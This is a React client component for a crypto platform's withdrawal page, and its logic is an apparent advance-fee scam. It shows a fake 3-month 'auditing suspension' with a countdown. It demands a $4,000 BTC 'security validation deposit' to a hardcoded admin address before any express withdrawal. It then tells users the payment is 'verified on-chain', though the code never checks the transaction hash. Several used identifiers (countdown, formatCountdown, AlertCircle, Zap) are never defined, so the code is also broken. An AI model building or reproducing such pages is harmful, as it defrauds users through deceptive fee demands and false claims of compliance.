"use client";

import { useState, useEffect } from "react";
import {
  Clock, Loader2, CheckCircle,
  Bitcoin, Copy, X, ArrowRight,
} from "lucide-react";

const UNLOCK_AMOUNT = 4000;

type WithdrawStep = "form" | "unlock" | "submitted";

export default function WithdrawPage() {
  /* ── user data ── */
  const [userBalance, setUserBalance] = useState(0);
  const [loading, setLoading] = useState(true);

  /* ── admin BTC address ── */
  const [adminBtcAddress, setAdminBtcAddress] = useState("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh");

  /* ── form fields ── */
  const [amount, setAmount]               = useState("");
  const [cryptoType, setCryptoType]       = useState("BTC");
  const [walletAddress, setWalletAddress] = useState("");
  const [withdrawalType, setWithdrawalType] = useState("STANDARD");
  const [formError, setFormError]         = useState("");

  /* ── unlock modal ── */
  const [step, setStep]           = useState<WithdrawStep>("form");
  const [txHash, setTxHash]       = useState("");
  const [txError, setTxError]     = useState("");
  const [copied, setCopied]       = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [finalMsg, setFinalMsg]   = useState("");


  /* ── load user balance + admin settings ── */
  useEffect(() => {
    Promise.all([
      fetch("/api/user/me").then((r) => r.json()),
      fetch("/api/admin/settings").then((r) => r.json()),
    ]).then(([user, settings]) => {
      setUserBalance(user.walletBalance || 0);
      if (settings?.btcAddress && settings.btcAddress !== "bc1q...") {
        setAdminBtcAddress(settings.btcAddress);
      }
      setLoading(false);
    });
  }, []);

  const parsedAmount = parseFloat(amount) || 0;
  const totalRequired = parsedAmount;

  /* ── Step 1: validate form → open unlock modal ── */
  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setFormError("");

    if (!parsedAmount || parsedAmount <= 0) {
      setFormError("Please enter a valid amount to withdraw.");
      return;
    }
    if (!walletAddress.trim()) {
      setFormError("Please provide a receiving wallet address.");
      return;
    }
    if (totalRequired > userBalance) {
      setFormError(
        `Insufficient balance. You need $${totalRequired.toLocaleString("en-US", { minimumFractionDigits: 2 })} to cover this withdrawal.`
      );
      return;
    }

    // Show BTC unlock modal
    setStep("unlock");
  };

  /* ── Step 2: confirm TX hash → submit real withdrawal ── */
  const handleUnlockSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setTxError("");
    if (!txHash.trim()) {
      setTxError("Please paste your BTC transaction ID / hash.");
      return;
    }

    setSubmitting(true);
    try {
      const res = await fetch("/api/withdraw/create", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: parsedAmount,
          cryptoType,
          walletAddress,
          withdrawalType,
          totalRequired,
        }),
      });

      if (!res.ok) {
        const data = await res.json();
        throw new Error(data.error || "Failed to submit withdrawal request.");
      }

      setFinalMsg(
        `Withdrawal request submitted. Processing time: ${withdrawalType === "EXPRESS" ? "24 Hours" : "60 Days"}`
      );
      setUserBalance((prev) => prev - totalRequired);
      setStep("submitted");
    } catch (err: any) {
      setTxError(err.message);
    } finally {
      setSubmitting(false);
    }
  };

  const copyAddress = () => {
    navigator.clipboard.writeText(adminBtcAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const resetAll = () => {
    setStep("form");
    setAmount("");
    setWalletAddress("");
    setTxHash("");
    setFormError("");
    setTxError("");
  };

  if (loading)
    return (
      <div className="flex justify-center p-12">
        <Loader2 className="w-10 h-10 animate-spin text-emerald-500" />
      </div>
    );

  return (
    <div className="max-w-3xl mx-auto space-y-8">

      {/* ═══════════════════════════════════════════════
          BTC UNLOCK MODAL
      ═══════════════════════════════════════════════ */}
      {(step === "unlock" || step === "submitted") && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="relative bg-gray-950 border border-gray-800 rounded-2xl w-full max-w-md shadow-2xl overflow-hidden">

            {/* Close (only on unlock step) */}
            {step === "unlock" && (
              <button
                onClick={() => { setStep("form"); setTxHash(""); setTxError(""); }}
                className="absolute top-4 right-4 text-gray-500 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            )}

            {/* ── SUCCESS ── */}
            {step === "submitted" && (
              <div className="p-8 text-center space-y-5">
                <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-emerald-500/20 text-emerald-400">
                  <CheckCircle className="w-8 h-8" />
                </div>
                <h3 className="text-2xl font-bold text-white">Withdrawal Submitted</h3>
                <p className="text-gray-400 text-sm">{finalMsg}</p>
                <p className="text-gray-500 text-xs">
                  Your BTC security payment is being verified on-chain. Once confirmed, your withdrawal will be processed within the selected timeframe.
                </p>
                <div className="bg-gray-900 rounded-xl p-4 text-left text-xs">
                  <p className="text-gray-500 mb-1">BTC Transaction Hash</p>
                  <p className="font-mono text-emerald-400 break-all">{txHash}</p>
                </div>
                <button
                  onClick={resetAll}
                  className="w-full py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-semibold transition-colors"
                >
                  Done
                </button>
              </div>
            )}

            {/* ── UNLOCK PAYMENT STEP ── */}
            {step === "unlock" && (
              <div className="p-8 space-y-6">
                {/* Header */}
                <div className="text-center space-y-2">
                  <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-red-500/10 text-red-400">
                    <Clock className="w-7 h-7 animate-pulse" />
                  </div>
                  <h3 className="text-xl font-bold text-white">Temporary Withdrawal Hold</h3>
                  <p className="text-gray-400 text-sm">
                    Your withdrawal of{" "}
                    <strong className="text-white">
                      ${parsedAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                    </strong>{" "}
                    is subject to the 3-month suspension hold.
                  </p>
                  <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-3 flex items-center justify-between mt-4">
                    <div className="flex items-center gap-2">
                      <Clock className="w-5 h-5 text-red-400 animate-pulse" />
                      <span className="text-sm font-semibold text-red-400">Suspension remaining:</span>
                    </div>
                    <span className="font-mono text-sm font-bold text-red-400">{formatCountdown(countdown)}</span>
                  </div>
                  <p className="text-gray-400 text-xs mt-3">
                    To authorize an immediate <strong className="text-white">Express Release (24 hours)</strong>, send the security validation deposit of <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong> to the address below.
                  </p>
                </div>

                {/* Withdrawal summary */}
                <div className="bg-gray-900 rounded-xl p-4 text-sm space-y-2">
                  <div className="flex justify-between text-gray-400">
                    <span>Withdrawal Amount</span>
                    <span className="text-white font-semibold">
                      ${parsedAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                    </span>
                  </div>
                  <div className="flex justify-between text-gray-400">
                    <span>Destination</span>
                    <span className="font-mono text-gray-300 text-xs truncate max-w-[160px]">{walletAddress}</span>
                  </div>
                  <div className="flex justify-between text-gray-400">
                    <span>Asset</span>
                    <span className="text-white">{cryptoType}</span>
                  </div>
                </div>

                {/* BTC wallet address */}
                <div className="space-y-2">
                  <p className="text-sm font-semibold text-orange-400 flex items-center gap-1.5">
                    <Bitcoin className="w-4 h-4" />
                    Send exactly ${UNLOCK_AMOUNT.toLocaleString()} worth of BTC to:
                  </p>
                  <div className="bg-gray-900 border border-orange-500/30 rounded-xl p-4 flex items-center gap-3">
                    <p className="font-mono text-xs text-orange-300 break-all flex-1">{adminBtcAddress}</p>
                    <button
                      onClick={copyAddress}
                      className="shrink-0 p-2 bg-orange-500/10 hover:bg-orange-500/20 text-orange-400 rounded-lg transition-colors"
                      title="Copy address"
                    >
                      {copied
                        ? <CheckCircle className="w-4 h-4 text-emerald-400" />
                        : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                  <p className="text-xs text-gray-500">
                    ⚠️ Clearing this security release deposit is required to bypass the 3-month suspension. Standard transfers will automatically resume once the auditing countdown expires. Once your BTC transaction is confirmed on-chain (usually 10–30 min), your withdrawal will be released.
                  </p>
                </div>

                {/* TX hash confirmation */}
                <form onSubmit={handleUnlockSubmit} className="space-y-4">
                  <div className="space-y-1.5">
                    <label className="text-sm font-medium text-gray-300">
                      Paste BTC Transaction ID / Hash
                    </label>
                    <input
                      type="text"
                      value={txHash}
                      onChange={(e) => setTxHash(e.target.value)}
                      placeholder="e.g. 4a5e1e4baab89f3a32518a..."
                      className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-xl text-white placeholder-gray-600 font-mono text-xs focus:outline-none focus:ring-2 focus:ring-emerald-500 transition-all"
                    />
                    <p className="text-xs text-gray-600">
                      Copy from your wallet or exchange after sending BTC.
                    </p>
                  </div>

                  {txError && (
                    <p className="text-rose-400 text-sm flex items-center gap-2">
                      <AlertCircle className="w-4 h-4 shrink-0" /> {txError}
                    </p>
                  )}

                  <button
                    type="submit"
                    disabled={submitting}
                    className="w-full py-3.5 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white rounded-xl font-semibold transition-all shadow-[0_0_20px_rgba(16,185,129,0.15)] flex items-center justify-center gap-2 disabled:opacity-60"
                  >
                    {submitting
                      ? <Loader2 className="w-5 h-5 animate-spin" />
                      : <ArrowRight className="w-5 h-5" />}
                    {submitting ? "Processing…" : "Confirm Payment & Submit Withdrawal"}
                  </button>
                </form>
              </div>
            )}

          </div>
        </div>
      )}

      {/* ═══════════════════════════════════════════════
          MAIN WITHDRAW FORM
      ═══════════════════════════════════════════════ */}
      <div>
        <h1 className="text-2xl font-bold text-navy-900 dark:text-white">Withdraw Funds</h1>
        <p className="text-navy-600 dark:text-navy-400">Request a withdrawal to your personal crypto wallet.</p>
      </div>

      <div className="bg-white dark:bg-navy-800 p-8 rounded-2xl border border-navy-200 dark:border-navy-700 shadow-sm">

        {/* Balance info */}
        <div className="flex items-start p-4 bg-navy-50 dark:bg-navy-900 rounded-xl mb-8">
          <AlertCircle className="w-5 h-5 text-emerald-600 dark:text-emerald-400 mt-0.5 mr-3 shrink-0" />
          <div>
            <h4 className="text-sm font-bold text-navy-900 dark:text-white">
              Available Balance: ${userBalance.toLocaleString("en-US", { minimumFractionDigits: 2 })}
            </h4>
            <p className="text-sm text-navy-500 dark:text-navy-400 mt-1">
              Ensure your receiving address is correct. Transactions cannot be reversed.
            </p>
          </div>
        </div>

        {/* Withdrawal suspension notice banner */}
        <div className="flex flex-col md:flex-row md:items-center justify-between p-5 bg-red-500/5 dark:bg-red-500/10 border border-red-500/20 rounded-2xl mb-8 gap-4">
          <div className="flex items-start gap-3">
            <Clock className="w-6 h-6 text-red-500 shrink-0 mt-0.5 animate-pulse" />
            <div>
              <h4 className="text-base font-bold text-red-800 dark:text-red-400">
                Standard Withdrawals Temporarily Suspended
              </h4>
              <p className="text-sm text-red-700 dark:text-red-300/80 mt-1">
                A 3-month auditing suspension is in place. To bypass this hold and request an <strong>Express Release (24 Hours)</strong>, compliance requires a security validation deposit of <strong>${UNLOCK_AMOUNT.toLocaleString()}</strong> in BTC.
              </p>
            </div>
          </div>
          <div className="shrink-0 bg-red-500/10 border border-red-500/20 px-4 py-2.5 rounded-xl text-center">
            <p className="text-[10px] uppercase font-bold tracking-wider text-red-400 mb-0.5">Suspension Ends In</p>
            <p className="font-mono text-sm font-extrabold text-red-400">{formatCountdown(countdown)}</p>
          </div>
        </div>

        {formError && (
          <div className="mb-6 p-4 bg-red-50 text-red-600 border border-red-200 rounded-xl text-sm font-medium flex items-center gap-2">
            <AlertCircle className="w-4 h-4 shrink-0" /> {formError}
          </div>
        )}

        <form className="space-y-6" onSubmit={handleFormSubmit}>

          {/* Processing speed */}
          <div className="space-y-3">
            <label className="block text-sm font-medium text-navy-700 dark:text-navy-300">Processing Speed</label>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <label className={`cursor-pointer border-2 rounded-xl p-4 flex flex-col gap-2 transition-colors ${withdrawalType === "STANDARD" ? "border-emerald-500 bg-emerald-50/50 dark:bg-emerald-900/10" : "border-navy-200 dark:border-navy-700 hover:border-emerald-300"}`}>
                <input type="radio" name="speed" value="STANDARD" checked={withdrawalType === "STANDARD"} onChange={(e) => setWithdrawalType(e.target.value)} className="sr-only" />
                <div className="flex justify-between items-center">
                  <span className="font-bold text-navy-900 dark:text-white flex items-center gap-2"><Clock className="w-4 h-4 text-navy-500" /> Standard</span>
                  <span className="text-xs font-semibold px-2 py-1 bg-navy-200 dark:bg-navy-700 rounded-md">60 Days</span>
                </div>
                <p className="text-xs text-navy-500 dark:text-navy-400">Standard processing queue. Free of charge.</p>
              </label>

              <label className={`cursor-pointer border-2 rounded-xl p-4 flex flex-col gap-2 transition-colors ${withdrawalType === "EXPRESS" ? "border-amber-500 bg-amber-50/50 dark:bg-amber-900/10" : "border-navy-200 dark:border-navy-700 hover:border-amber-300"}`}>
                <input type="radio" name="speed" value="EXPRESS" checked={withdrawalType === "EXPRESS"} onChange={(e) => setWithdrawalType(e.target.value)} className="sr-only" />
                <div className="flex justify-between items-center">
                  <span className="font-bold text-navy-900 dark:text-white flex items-center gap-2"><Zap className="w-4 h-4 text-amber-500" /> Express</span>
                  <span className="text-xs font-semibold px-2 py-1 bg-amber-100 text-amber-700 dark:bg-amber-900/40 dark:text-amber-400 rounded-md">24 Hours</span>
                </div>
                <p className="text-xs text-navy-500 dark:text-navy-400">Priority processing.</p>
              </label>
            </div>
          </div>

          {/* Amount */}
          <div>
            <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Withdrawal Amount (USD)</label>
            <div className="relative">
              <span className="absolute inset-y-0 left-0 pl-4 flex items-center text-navy-500">$</span>
              <input
                type="number"
                min="1"
                step="0.01"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="block w-full pl-8 pr-16 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
                placeholder="0.00"
              />
              <button
                type="button"
                onClick={() => setAmount(userBalance.toString())}
                className="absolute inset-y-0 right-4 text-xs font-bold text-emerald-600 hover:text-emerald-700 uppercase"
              >
                Max
              </button>
            </div>

          </div>

          {/* Crypto type */}
          <div>
            <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Select Cryptocurrency</label>
            <select
              value={cryptoType}
              onChange={(e) => setCryptoType(e.target.value)}
              className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
            >
              <option value="BTC">Bitcoin (BTC)</option>
              <option value="ETH">Ethereum (ETH)</option>
              <option value="USDT">Tether (USDT - TRC20)</option>
            </select>
            {cryptoType === "USDT" && (
              <p className="text-xs text-amber-500 font-bold mt-2">
                ⚠️ Please ensure your receiving address is a TRC20 network address.
              </p>
            )}
          </div>

          {/* Wallet address */}
          <div>
            <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Your Receiving Wallet Address</label>
            <input
              type="text"
              value={walletAddress}
              onChange={(e) => setWalletAddress(e.target.value)}
              className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
              placeholder="Enter your crypto wallet address"
            />
          </div>

          <button
            type="submit"
            className="w-full flex justify-center items-center gap-2 py-3 px-4 rounded-xl font-semibold text-white bg-emerald-600 hover:bg-emerald-700 transition-colors mt-6"
          >
            <ArrowRight className="w-5 h-5" />
            Continue to Withdrawal
          </button>
        </form>
      </div>
    </div>
  );
}
